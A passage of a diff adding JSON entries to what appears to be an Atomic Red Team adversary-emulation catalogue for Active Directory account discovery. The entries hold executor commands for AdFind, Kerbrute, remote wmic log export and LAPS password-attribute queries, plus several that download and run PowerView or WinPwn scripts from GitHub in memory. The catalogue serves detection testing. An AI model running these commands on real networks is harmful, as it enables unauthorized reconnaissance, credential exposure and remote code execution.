+                                "description": "AdFind.exe must exist on disk at specified location (PathToAtomicsFolder\\..\\ExternalPayloads\\AdFind.exe)\n",
+                                "prereq_command": "if (Test-Path \"PathToAtomicsFolder\\..\\ExternalPayloads\\AdFind.exe\") {exit 0} else {exit 1}\n",
+                                "get_prereq_command": "New-Item -Type Directory (split-path \"PathToAtomicsFolder\\..\\ExternalPayloads\\AdFind.exe\") -ErrorAction ignore | Out-Null\nInvoke-WebRequest -Uri \"https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1087.002/bin/AdFind.exe\" -OutFile \"PathToAtomicsFolder\\..\\ExternalPayloads\\AdFind.exe\"\n"
+                            }
+                        ],
+                        "executor": {
+                            "command": "\"PathToAtomicsFolder\\..\\ExternalPayloads\\AdFind.exe\" -f (objectcategory=person) #{optional_args}\n",
+                            "name": "command_prompt"
+                        }
+                    },
+                    {
+                        "name": "Adfind - Enumerate Active Directory Exchange AD Objects",
+                        "auto_generated_guid": "5e2938fb-f919-47b6-8b29-2f6a1f718e99",
+                        "description": "Adfind tool can be used for reconnaissance in an Active directory environment. This example has been documented by ransomware actors enumerating Active Directory Exchange Objects\nreference- http://www.joeware.net/freetools/tools/adfind/, https://www.fireeye.com/blog/threat-research/2019/04/pick-six-intercepting-a-fin6-intrusion.html\n",
+                        "supported_platforms": [
+                            "windows"
+                        ],
+                        "input_arguments": {
+                            "optional_args": {
+                                "description": "Allows defining arguments to add to the adfind command to tailor it to the specific needs of the environment. Use \"-arg\" notation to add arguments separated by spaces.",
+                                "type": "string",
+                                "default": null
+                            }
+                        },
+                        "dependency_executor_name": "powershell",
+                        "dependencies": [
+                            {
+                                "description": "AdFind.exe must exist on disk at specified location (PathToAtomicsFolder\\..\\ExternalPayloads\\AdFind.exe)\n",
+                                "prereq_command": "if (Test-Path \"PathToAtomicsFolder\\..\\ExternalPayloads\\AdFind.exe\") {exit 0} else {exit 1}\n",
+                                "get_prereq_command": "New-Item -Type Directory (split-path \"PathToAtomicsFolder\\..\\ExternalPayloads\\AdFind.exe\") -ErrorAction ignore | Out-Null\nInvoke-WebRequest -Uri \"https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1087.002/bin/AdFind.exe\" -OutFile \"PathToAtomicsFolder\\..\\ExternalPayloads\\AdFind.exe\"\n"
+                            }
+                        ],
+                        "executor": {
+                            "command": "\"PathToAtomicsFolder\\..\\ExternalPayloads\\AdFind.exe\" -sc exchaddresses #{optional_args}\n",
+                            "name": "command_prompt"
+                        }
+                    },
+                    {
+                        "name": "Enumerate Default Domain Admin Details (Domain)",
+                        "auto_generated_guid": "c70ab9fd-19e2-4e02-a83c-9cfa8eaa8fef",
+                        "description": "This test will enumerate the details of the built-in domain admin account\n",
+                        "supported_platforms": [
+                            "windows"
+                        ],
+                        "executor": {
+                            "command": "net user administrator /domain\n",
+                            "name": "command_prompt"
+                        }
+                    },
+                    {
+                        "name": "Enumerate Active Directory for Unconstrained Delegation",
+                        "auto_generated_guid": "46f8dbe9-22a5-4770-8513-66119c5be63b",
+                        "description": "Attackers may attempt to query for computer objects with the UserAccountControl property\n'TRUSTED_FOR_DELEGATION' (0x80000;524288) set\nMore Information - https://shenaniganslabs.io/2019/01/28/Wagging-the-Dog.html#when-the-stars-align-unconstrained-delegation-leads-to-rce\nPrerequisite: AD RSAT PowerShell module is needed and it must run under a domain user\n",
+                        "supported_platforms": [
+                            "windows"
+                        ],
+                        "input_arguments": {
+                            "domain": {
+                                "description": "Domain FQDN",
+                                "type": "string",
+                                "default": "$env:UserDnsDomain"
+                            },
+                            "uac_prop": {
+                                "description": "UAC Property to search",
+                                "type": "integer",
+                                "default": 524288
+                            }
+                        },
+                        "dependencies": [
+                            {
+                                "description": "PowerShell ActiveDirectory Module must be installed\n",
+                                "prereq_command": "Try {\n    Import-Module ActiveDirectory -ErrorAction Stop | Out-Null\n    exit 0\n}\nCatch {\n    exit 1\n}\n",
+                                "get_prereq_command": "if((Get-CimInstance -ClassName Win32_OperatingSystem).ProductType -eq 1) {\n  Add-WindowsCapability -Name (Get-WindowsCapability -Name RSAT.ActiveDirectory.DS* -Online).Name -Online\n} else {\n  Install-WindowsFeature RSAT-AD-PowerShell\n}\n"
+                            }
+                        ],
+                        "executor": {
+                            "name": "powershell",
+                            "elevation_required": false,
+                            "command": "Get-ADObject -LDAPFilter '(UserAccountControl:1.2.840.113556.1.4.803:=#{uac_prop})' -Server #{domain}\n"
+                        }
+                    },
+                    {
+                        "name": "Get-DomainUser with PowerView",
+                        "auto_generated_guid": "93662494-5ed7-4454-a04c-8c8372808ac2",
+                        "description": "Utilizing PowerView, run Get-DomainUser to identify the domain users. Upon execution, Users within the domain will be listed.\n",
+                        "supported_platforms": [
+                            "windows"
+                        ],
+                        "executor": {
+                            "command": "[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12\nIEX (IWR 'https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Recon/PowerView.ps1' -UseBasicParsing); Get-DomainUser -verbose\n",
+                            "name": "powershell"
+                        }
+                    },
+                    {
+                        "name": "Enumerate Active Directory Users with ADSISearcher",
+                        "auto_generated_guid": "02e8be5a-3065-4e54-8cc8-a14d138834d3",
+                        "description": "The following Atomic test will utilize ADSISearcher to enumerate users within Active Directory.\nUpon successful execution a listing of users will output with their paths in AD.\nReference: https://devblogs.microsoft.com/scripting/use-the-powershell-adsisearcher-type-accelerator-to-search-active-directory/\n",
+                        "supported_platforms": [
+                            "windows"
+                        ],
+                        "executor": {
+                            "name": "powershell",
+                            "elevation_required": false,
+                            "command": "([adsisearcher]\"objectcategory=user\").FindAll(); ([adsisearcher]\"objectcategory=user\").FindOne()\n"
+                        }
+                    },
+                    {
+                        "name": "Enumerate Linked Policies In ADSISearcher Discovery",
+                        "auto_generated_guid": "7ab0205a-34e4-4a44-9b04-e1541d1a57be",
+                        "description": "The following Atomic test will utilize ADSISearcher to enumerate organizational unit within Active Directory.\nUpon successful execution a listing of users will output with their paths in AD.\nReference: https://medium.com/@pentesttas/discover-hidden-gpo-s-on-active-directory-using-ps-adsi-a284b6814c81\n",
+                        "supported_platforms": [
+                            "windows"
+                        ],
+                        "executor": {
+                            "name": "powershell",
+                            "elevation_required": false,
+                            "command": "(([adsisearcher]'(objectcategory=organizationalunit)').FindAll()).Path | %{if(([ADSI]\"$_\").gPlink){Write-Host \"[+] OU Path:\"([ADSI]\"$_\").Path;$a=((([ADSI]\"$_\").gplink) -replace \"[[;]\" -split \"]\");for($i=0;$i -lt $a.length;$i++){if($a[$i]){Write-Host \"Policy Path[$i]:\"([ADSI]($a[$i]).Substring(0,$a[$i].length-1)).Path;Write-Host \"Policy Name[$i]:\"([ADSI]($a[$i]).Substring(0,$a[$i].length-1)).DisplayName} };Write-Output \"`n\" }}\n"
+                        }
+                    },
+                    {
+                        "name": "Enumerate Root Domain linked policies Discovery",
+                        "auto_generated_guid": "00c652e2-0750-4ca6-82ff-0204684a6fe4",
+                        "description": "The following Atomic test will utilize ADSISearcher to enumerate root domain unit within Active Directory.\nUpon successful execution a listing of users will output with their paths in AD.\nReference: https://medium.com/@pentesttas/discover-hidden-gpo-s-on-active-directory-using-ps-adsi-a284b6814c81\n",
+                        "supported_platforms": [
+                            "windows"
+                        ],
+                        "executor": {
+                            "name": "powershell",
+                            "elevation_required": false,
+                            "command": "(([adsisearcher]'').SearchRooT).Path | %{if(([ADSI]\"$_\").gPlink){Write-Host \"[+] Domain Path:\"([ADSI]\"$_\").Path;$a=((([ADSI]\"$_\").gplink) -replace \"[[;]\" -split \"]\");for($i=0;$i -lt $a.length;$i++){if($a[$i]){Write-Host \"Policy Path[$i]:\"([ADSI]($a[$i]).Substring(0,$a[$i].length-1)).Path;Write-Host \"Policy Name[$i]:\"([ADSI]($a[$i]).Substring(0,$a[$i].length-1)).DisplayName} };Write-Output \"`n\" }}\n"
+                        }
+                    },
+                    {
+                        "name": "WinPwn - generaldomaininfo",
+                        "auto_generated_guid": "ce483c35-c74b-45a7-a670-631d1e69db3d",
+                        "description": "Gathers general domain information using the generaldomaininfo function of WinPwn",
+                        "supported_platforms": [
+                            "windows"
+                        ],
+                        "executor": {
+                            "command": "iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/WinPwn/121dcee26a7aca368821563cbe92b2b5638c5773/WinPwn.ps1')\ngeneraldomaininfo -noninteractive -consoleoutput",
+                            "name": "powershell"
+                        }
+                    },
+                    {
+                        "name": "Kerbrute - userenum",
+                        "auto_generated_guid": "f450461c-18d1-4452-9f0d-2c42c3f08624",
+                        "description": "Enumerates active directory usernames using the userenum function of Kerbrute",
+                        "supported_platforms": [
+                            "windows"
+                        ],
+                        "input_arguments": {
+                            "Domain": {
+                                "description": "Domain that is being tested against",
+                                "type": "string",
+                                "default": "$env:USERDOMAIN"
+                            },
+                            "DomainController": {
+                                "description": "Domain Controller that is being tested against",
+                                "type": "string",
+                                "default": "$env:UserDnsDomain"
+                            }
+                        },
+                        "dependency_executor_name": "powershell",
+                        "dependencies": [
+                            {
+                                "description": "kerbrute.exe must exist in PathToAtomicsFolder\\..\\ExternalPayloads.\n",
+                                "prereq_command": "if (test-path \"PathToAtomicsFolder\\..\\ExternalPayloads\\kerbrute.exe\"){exit 0} else {exit 1}\n",
+                                "get_prereq_command": "New-Item -Type Directory \"PathToAtomicsFolder\\..\\ExternalPayloads\\\" -ErrorAction ignore -Force | Out-Null\ninvoke-webrequest \"https://github.com/ropnop/kerbrute/releases/download/v1.0.3/kerbrute_windows_386.exe\" -outfile \"PathToAtomicsFolder\\..\\ExternalPayloads\\kerbrute.exe\"\n"
+                            },
+                            {
+                                "description": "username text file must exist in PathToAtomicsFolder\\..\\ExternalPayloads.\n",
+                                "prereq_command": "if (test-path \"PathToAtomicsFolder\\..\\ExternalPayloads\\username.txt\"){exit 0} else {exit 1}\n",
+                                "get_prereq_command": "New-Item -Type Directory \"PathToAtomicsFolder\\..\\ExternalPayloads\\\" -ErrorAction ignore -Force | Out-Null\ninvoke-webrequest \"https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1087.002/src/username.txt?raw=true\" -outfile \"PathToAtomicsFolder\\..\\ExternalPayloads\\username.txt\"\n"
+                            }
+                        ],
+                        "executor": {
+                            "command": "cd \"PathToAtomicsFolder\\..\\ExternalPayloads\"\n.\\kerbrute.exe userenum -d #{Domain} --dc #{DomainController} \"PathToAtomicsFolder\\..\\ExternalPayloads\\username.txt\"",
+                            "name": "powershell"
+                        }
+                    },
+                    {
+                        "name": "Wevtutil - Discover NTLM Users Remote",
+                        "auto_generated_guid": "b8a563d4-a836-4993-a74e-0a19b8481bfe",
+                        "description": "This test discovers users who have authenticated against a Domain Controller via NTLM. \nThis is done remotely via wmic and captures the event code 4776 from the domain controller and stores the ouput in C:\\temp. [Reference](https://www.reliaquest.com/blog/socgholish-fakeupdates/)\n",
+                        "supported_platforms": [
+                            "windows"
+                        ],
+                        "executor": {
+                            "command": "$target = $env:LOGONSERVER\n$target = $target.Trim(\"\\\\\")\n$IpAddress = [System.Net.Dns]::GetHostAddresses($target) | select IPAddressToString -ExpandProperty IPAddressToString\nwmic.exe /node:$IpAddress process call create 'wevtutil epl Security C:\\\\ntlmusers.evtx /q:\\\"Event[System[(EventID=4776)]]\"'",
+                            "cleanup_command": "Remove-Item -Path \\\\$IpAddress\\c$\\ntlmusers.evtx\n",
+                            "name": "powershell"
+                        }
+                    },
+                    {
+                        "name": "Suspicious LAPS Attributes Query with Get-ADComputer all properties",
+                        "auto_generated_guid": "394012d9-2164-4d4f-b9e5-acf30ba933fe",
+                        "description": "This test executes LDAP query using powershell command Get-ADComputer and lists all the properties including Microsoft LAPS attributes ms-mcs-AdmPwd and ms-mcs-AdmPwdExpirationTime",
+                        "supported_platforms": [
+                            "windows"
+                        ],
+                        "input_arguments": {
+                            "hostname": {
+                                "description": "Name of the host",
+                                "type": "string",
+                                "default": "$env:computername"
+                            }
+                        },
+                        "executor": {
+                            "command": "Get-ADComputer #{hostname} -Properties *",
+                            "cleanup_command": null,
+                            "name": "powershell",
+                            "elevation_required": false
+                        }
+                    },
+                    {
+                        "name": "Suspicious LAPS Attributes Query with Get-ADComputer ms-Mcs-AdmPwd property",
+                        "auto_generated_guid": "6e85bdf9-7bc4-4259-ac0f-f0cb39964443",
+                        "description": "This test executes LDAP query using powershell command Get-ADComputer and lists Microsoft LAPS attributes ms-mcs-AdmPwd and ms-mcs-AdmPwdExpirationTime",
+                        "supported_platforms": [
+                            "windows"
+                        ],
+                        "input_arguments": {
+                            "hostname": {
+                                "description": "Name of the host",
+                                "type": "string",
+                                "default": "$env:computername"
+                            }
+                        },
+                        "executor": {
+                            "command": "Get-ADComputer #{hostname} -Properties ms-Mcs-AdmPwd, ms-Mcs-AdmPwdExpirationTime",
+                            "cleanup_command": null,
+                            "name": "powershell",
+                            "elevation_required": false
+                        }
+                    },
+                    {
+                        "name": "Suspicious LAPS Attributes Query with Get-ADComputer all properties and SearchScope",
+                        "auto_generated_guid": "ffbcfd62-15d6-4989-a21a-80bfc8e58bb5",
+                        "description": "This test executes LDAP query using powershell command Get-ADComputer with SearchScope as subtree and lists all the properties including Microsoft LAPS attributes ms-mcs-AdmPwd and ms-mcs-AdmPwdExpirationTime",
+                        "supported_platforms": [
+                            "windows"
+                        ],
+                        "executor": {
+                            "command": "Get-adcomputer -SearchScope subtree -filter \"name -like '*'\" -Properties *",
+                            "cleanup_command": null,
+                            "name": "powershell",
+                            "elevation_required": false
+                        }
+                    },
+                    {
+                        "name": "Suspicious LAPS Attributes Query with adfind all properties",
+                        "auto_generated_guid": "abf00f6c-9983-4d9a-afbc-6b1c6c6448e1",
+                        "description": "This test executes LDAP query using adfind command and lists all the attributes including Microsoft LAPS attributes ms-mcs-AdmPwd and ms-mcs-AdmPwdExpirationTime",
+                        "supported_platforms": [
+                            "windows"
+                        ],
+                        "input_arguments": {
+                            "optional_args": {
+                                "description": "Allows defining arguments to add to the adfind command to tailor it to the specific needs of the environment. Use \"-arg\" notation to add arguments separated by spaces.",
+                                "type": "string",
+                                "default": null
+                            },
+                            "domain": {
+                                "description": "Domain of the host",
+                                "type": "string",
+                                "default": "$env:USERDOMAIN"
+                            }
+                        },
+                        "executor": {
+                            "command": "& \"PathToAtomicsFolder\\..\\ExternalPayloads\\AdFind.exe\" #{optional_args} -h #{domain} -s subtree -f \"objectclass=computer\" *\n",
+                            "cleanup_command": null,
+                            "name": "powershell",
+                            "elevation_required": false
+                        }
+                    },
+                    {
+                        "name": "Suspicious LAPS Attributes Query with adfind ms-Mcs-AdmPwd",
+                        "auto_generated_guid": "51a98f96-0269-4e09-a10f-e307779a8b05",
+                        "description": "This test executes LDAP query using adfind command and lists Microsoft LAPS attributes ms-mcs-AdmPwd and ms-mcs-AdmPwdExpirationTime",
+                        "supported_platforms": [
+                            "windows"
+                        ],
+                        "input_arguments": {
+                            "optional_args": {
+                                "description": "Allows defining arguments to add to the adfind command to tailor it to the specific needs of the environment. Use \"-arg\" notation to add arguments separated by spaces.",
+                                "type": "string",
+                                "default": null
+                            },
+                            "domain": {
+                                "description": "Domain of the host",
+                                "type": "string",
+                                "default": "$env:USERDOMAIN"
+                            }
+                        },
+                        "executor": {
+                            "command": "& \"PathToAtomicsFolder\\..\\ExternalPayloads\\AdFind.exe\" #{optional_args} -h #{domain} -s subtree -f \"objectclass=computer\" ms-Mcs-AdmPwd, ms-Mcs-AdmPwdExpirationTime\n",
+                            "cleanup_command": null,
+                            "name": "powershell",
+                            "elevation_required": false
+                        }
+                    },
+                    {
+                        "name": "Active Directory Domain Search",
+                        "auto_generated_guid": "096b6d2a-b63f-4100-8fa0-525da4cd25ca",
+                        "description": "Output information from LDAPSearch. LDAP Password is the admin-user password on Active Directory\n",
+                        "supported_platforms": [
+                            "linux"
+                        ],
+                        "input_arguments": {
+                            "domain": {
+                                "description": "The domain to be tested",
+                                "type": "string",
+                                "default": "example"
+                            },
+                            "top_level_domain": {
+                                "description": "The top level domain (.com, .test, .remote, etc... following domain, minus the .)",
+                                "type": "string",
+                                "default": "test"
+                            },
+                            "user": {
+                                "description": "username@domain of a user within the ad database",
+                                "type": "string",
+                                "default": "user@example.test"
+                            },
+                            "password": {
+                                "description": "password of the user with admin privileges referenced in admin_user",
+                                "type": "string",
+                                "default": "s3CurePssw0rD!"
+                            }
+                        },
+                        "dependency_executor_name": "sh",
+                        "dependencies": [
+                            {
+                                "description": "Packages sssd-ad sssd-tools realmd adcli installed and realm available, ldapsearch\n",
+                                "prereq_command": "which ldapsearch\n",
+                                "get_prereq_command": "echo ldapsearch not found\n"
+                            }
+                        ],
+                        "executor": {
+                            "elevation_required": false,
+                            "command": "ldapsearch -H ldap://#{domain}.#{top_level_domain}:389 -x -D #{user} -w #{password} -b \"CN=Users,DC=#{domain},DC=#{top_level_domain}\" -s sub -a always -z 1000 dn\n",
+                            "name": "sh"
+                        }
+                    },
+                    {
+                        "name": "Account Enumeration with LDAPDomainDump",
+                        "auto_generated_guid": "a54d497e-8dbe-4558-9895-44944baa395f",
+                        "description": "This test uses LDAPDomainDump to perform account enumeration on a domain.\n[Reference](https://securityonline.info/ldapdomaindump-active-directory-information-dumper-via-ldap/)\n",
+                        "supported_platforms": [
+                            "linux"
+                        ],
+                        "input_arguments": {
+                            "username": {
+                                "description": "Username and domain to authenticate with",
+                                "type": "string",
+                                "default": "domain\\user"
+                            },
+                            "target_ip": {
+                                "description": "IP to connect to",
+                                "type": "string",
+                                "default": "127.0.0.1"
+                            },
+                            "password": {
+                                "description": "Password to authenticate with",
+                                "type": "string",
+                                "default": "password"
+                            }
+                        },
+                        "dependency_executor_name": "sh",
+                        "dependencies": [
+                            {
+                                "description": "Python3 must be installed",
+                                "prereq_command": "if [ -x \"$(command -v python3 --version)\" ]; then exit 0; else exit 1; fi;",
+                                "get_prereq_command": "sudo apt-get -y install python3"
+                            },
+                            {
+                                "description": "Pip must be installed",
+                                "prereq_command": "if [ -x \"$(command -v pip --version)\" ]; then exit 0; else exit 1; fi;",
+                                "get_prereq_command": "wget -O /tmp/get-pip.py https://bootstrap.pypa.io/pip/3.6/get-pip.py\npython3 /tmp/get-pip.py"
+                            },
+                            {
+                                "description": "The ldapdomaindump module must be installed",
+                                "prereq_command": "python3 -c 'import ldapdomaindump' 2>/dev/null",
+                                "get_prereq_command": "pip install ldapdomaindump"
+                            },
+                            {
+                                "description": "The future module must be installed",
+                                "prereq_command": "python3 -c 'import future' 2>/dev/null",
+                                "get_prereq_command": "pip install future"
+                            }
+                        ],
+                        "executor": {
+                            "command": "ldapdomaindump -u #{username} -p #{password} #{target_ip} -o /tmp/T1087",
+                            "cleanup_command": "rm -rf /tmp/T1087/ 2>/dev/null \n",
+                            "name": "sh",
+                            "elevation_required": false
+                        }
+                    }
+                ]
+            }
+        ]
+    },
+    "timestamp": "2025-02-28 12:39:52"
+}
